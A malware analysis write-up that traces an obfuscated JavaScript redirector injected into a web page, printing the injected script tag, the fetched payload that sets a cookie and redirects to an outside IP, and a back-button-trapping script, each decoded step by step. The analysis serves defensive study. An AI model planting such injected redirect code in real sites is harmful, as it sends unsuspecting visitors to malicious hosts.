# Analysis

Looking at the source code we see a part of obsfuscated javascript i.e
```javascript
<script type="text/javascript">var _0x2515=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0x2515[5]](_0x2515[4][_0x2515[3]](_0x2515[0])[_0x2515[2]]()[_0x2515[1]](_0x2515[0]));</script></head>
```

The above gets translated into
```javascript
document.write('>tpircs/<>"sj\.yreuqj/87\.611\.942\.431//:ptth"=crs tpircs<'.split("").reverse().join(""))
```
which is again a tricky way of saying 
```javascript
document.write('<script src=http://134.249.116.78/jquery.js></script>')
```

```bash
curl http://134.249.116.78/jquery.js
```

```javascript
var _0x93b0=["","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39","\x72\x61\x6E\x64\x6F\x6D","\x6C\x65\x6E\x67\x74\x68","\x66\x6C\x6F\x6F\x72","\x63\x68\x61\x72\x41\x74","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x5F\x5F\x63\x66\x73\x75\x69\x64","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70","\x3A\x2F\x2F","\x31\x33\x34\x2E","\x32\x34\x39\x2E","\x31\x31\x36\x2E","\x37\x38\x2F\x3F\x6B\x65\x79\x3D"];function rdn(){var _0xf31cx2=_0x93b0[0];var _0xf31cx3=_0x93b0[1];for(var _0xf31cx4=0;_0xf31cx4< 32;_0xf31cx4++){_0xf31cx2+= _0xf31cx3[_0x93b0[5]](Math[_0x93b0[4]](Math[_0x93b0[2]]()* _0xf31cx3[_0x93b0[3]]))};return _0xf31cx2}function _mmm_(_0xf31cx6,_0xf31cx7,_0xf31cx8,_0xf31cx9){var _0xf31cxa= new Date();var _0xf31cxb= new Date();if(_0xf31cx8=== null|| _0xf31cx8=== 0){_0xf31cx8= 3};_0xf31cxb[_0x93b0[7]](_0xf31cxa[_0x93b0[6]]()+ 3600000* 24* _0xf31cx8);document[_0x93b0[8]]= _0xf31cx6+ _0x93b0[9]+ escape(_0xf31cx7)+ _0x93b0[10]+ _0xf31cxb[_0x93b0[11]]()+ ((_0xf31cx9)?_0x93b0[12]+ _0xf31cx9:_0x93b0[0])}function _nnn_(_0xf31cxd){var _0xf31cxe=document[_0x93b0[8]][_0x93b0[13]](_0xf31cxd+ _0x93b0[9]);var _0xf31cxf=_0xf31cxe+ _0xf31cxd[_0x93b0[3]]+ 1;if((!_0xf31cxe) && (_0xf31cxd!= document[_0x93b0[8]][_0x93b0[14]](0,_0xf31cxd[_0x93b0[3]]))){return null};if(_0xf31cxe==  -1){return null};var _0xf31cx10=document[_0x93b0[8]][_0x93b0[13]](_0x93b0[15],_0xf31cxf);if(_0xf31cx10==  -1){_0xf31cx10= document[_0x93b0[8]][_0x93b0[3]]};return unescape(document[_0x93b0[8]][_0x93b0[14]](_0xf31cxf,_0xf31cx10))}if(navigator[_0x93b0[16]]){if(_nnn_(_0x93b0[17])== 1){}else {_mmm_(_0x93b0[17],_0x93b0[18],_0x93b0[18],_0x93b0[19]);window[_0x93b0[21]][_0x93b0[20]]= _0x93b0[22]+ _0x93b0[23]+ _0x93b0[24]+ _0x93b0[25]+ _0x93b0[26]+ _0x93b0[27]+ rdn()}}
```

```javascript
var _0x93b0 = ["", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", "random", "length", "floor", "charAt", "getTime", "setTime", "cookie", "=", ";expires=", "toGMTString", "; path=", "indexOf", "substring", ";", "cookieEnabled", "__cfsuid", "1", "/", "href", "location", "http", "://", "134.", "249.", "116.", "78/?key="];

function rdn() {
    var _0xf31cx2 = _0x93b0[0];
    var _0xf31cx3 = _0x93b0[1];
    for (var _0xf31cx4 = 0; _0xf31cx4 < 32; _0xf31cx4++) {
        _0xf31cx2 += _0xf31cx3[_0x93b0[5]](Math[_0x93b0[4]](Math[_0x93b0[2]]() * _0xf31cx3[_0x93b0[3]]))
    };
    return _0xf31cx2
}

function _mmm_(_0xf31cx6, _0xf31cx7, _0xf31cx8, _0xf31cx9) {
    var _0xf31cxa = new Date();
    var _0xf31cxb = new Date();
    if (_0xf31cx8 === null || _0xf31cx8 === 0) {
        _0xf31cx8 = 3
    };
    _0xf31cxb[_0x93b0[7]](_0xf31cxa[_0x93b0[6]]() + 3600000 * 24 * _0xf31cx8);
    document[_0x93b0[8]] = _0xf31cx6 + _0x93b0[9] + escape(_0xf31cx7) + _0x93b0[10] + _0xf31cxb[_0x93b0[11]]() + ((_0xf31cx9) ? _0x93b0[12] + _0xf31cx9 : _0x93b0[0])
}

function _nnn_(_0xf31cxd) {
    var _0xf31cxe = document[_0x93b0[8]][_0x93b0[13]](_0xf31cxd + _0x93b0[9]);
    var _0xf31cxf = _0xf31cxe + _0xf31cxd[_0x93b0[3]] + 1;
    if ((!_0xf31cxe) && (_0xf31cxd != document[_0x93b0[8]][_0x93b0[14]](0, _0xf31cxd[_0x93b0[3]]))) {
        return null
    };
    if (_0xf31cxe == -1) {
        return null
    };
    var _0xf31cx10 = document[_0x93b0[8]][_0x93b0[13]](_0x93b0[15], _0xf31cxf);
    if (_0xf31cx10 == -1) {
        _0xf31cx10 = document[_0x93b0[8]][_0x93b0[3]]
    };
    return unescape(document[_0x93b0[8]][_0x93b0[14]](_0xf31cxf, _0xf31cx10))
}
if (navigator[_0x93b0[16]]) {
    if (_nnn_(_0x93b0[17]) == 1) {} else {
        _mmm_(_0x93b0[17], _0x93b0[18], _0x93b0[18], _0x93b0[19]);
        window[_0x93b0[21]][_0x93b0[20]] = _0x93b0[22] + _0x93b0[23] + _0x93b0[24] + _0x93b0[25] + _0x93b0[26] + _0x93b0[27] + rdn()
    }
}
```

The above function makes the request as 
```
window[http://134.249.116.78/cloud.php] = "http://134.249.116.78?key=<random_letters>"
```

This means upon visiting the html a javascript is executed which makes request to 134.249.116.78?key=<something> which then again makes a request to 134.249.116.78/cloud.php which contains the below code

```javascript
<script>window.location.replace("http://polagerater.tk/index/?6871568466678");window.location.href = "http://polagerater.tk/index/?6871568466678";</script>
```

This now makes request to http://polagerater.tk/index/?6871568466678 . Making curl request to above domain gives 302 redirection to 
>http://www.wosemdesy.site/?u=h2xkd0x&o=lxkgnum&t=cid:1316&cid=1316-11111-2020031821203911a02

Looking the at the source code, we see refer to ../../media/bb.js which is again an obsfuscated javascript.

```javascript
var _0x1b1f=['=([^&#]*)','exec','search','location','href','includes','pushState','state','replace','x=1','[\x5c?&]'];(function(_0xb67384,_0x27295a){var _0x156d7c=function(_0x52a1f8){while(--_0x52a1f8){_0xb67384['push'](_0xb67384['shift']());}};_0x156d7c(++_0x27295a);}(_0x1b1f,0x8a));var _0x2cf4=function(_0x19a34d,_0x27abd6){_0x19a34d=_0x19a34d-0x0;var _0x10c5af=_0x1b1f[_0x19a34d];return _0x10c5af;};var PreventBb=![];getUrlParameter('b')==='0'?PreventBb=!![]:PreventBb=![];!function(){if(!PreventBb){var _0x42037b;try{for(_0x42037b=0x0;0xa>_0x42037b;++_0x42037b)history[_0x2cf4('0x0')]({},'','');onpopstate=function(_0x42037b){_0x42037b[_0x2cf4('0x1')]&&location[_0x2cf4('0x2')](getUrlWithParam(_0x2cf4('0x3')));};}catch(_0xdad22f){}}}();function getUrlParameter(_0x5307be){_0x5307be=_0x5307be[_0x2cf4('0x2')](/[\[]/,'\x5c[')[_0x2cf4('0x2')](/[\]]/,'\x5c]');var _0x5e0c67=new RegExp(_0x2cf4('0x4')+_0x5307be+_0x2cf4('0x5')),_0x3a6a0a=_0x5e0c67[_0x2cf4('0x6')](location[_0x2cf4('0x7')]);return _0x3a6a0a===null?'':decodeURIComponent(_0x3a6a0a[0x1][_0x2cf4('0x2')](/\+/g,'\x20'));}function getUrlWithParam(_0x41c91c){var _0x2ce333=window[_0x2cf4('0x8')][_0x2cf4('0x9')];if(_0x2ce333[_0x2cf4('0xa')]('x=')){_0x2ce333=_0x2ce333[_0x2cf4('0x2')](/(x=)[0-9]{1,2}/,_0x41c91c);}else{_0x2ce333=_0x2ce333+'&'+_0x41c91c;}return _0x2ce333;}
```

which upon decoding again redirects to another site and the game goes on. Based on above analysis and controlled browsing the page by using burp we conconclude that its an **Torjan Redirector**
